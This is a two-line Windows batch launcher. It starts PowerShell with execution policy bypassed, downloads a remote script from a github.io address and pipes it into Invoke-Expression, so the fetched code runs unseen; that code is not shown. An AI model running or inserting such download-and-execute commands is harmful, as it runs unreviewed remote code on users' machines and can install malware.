@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://nocapscripts.github.io/LocalOnly/local.ps1' -UseBasicParsing | iex"
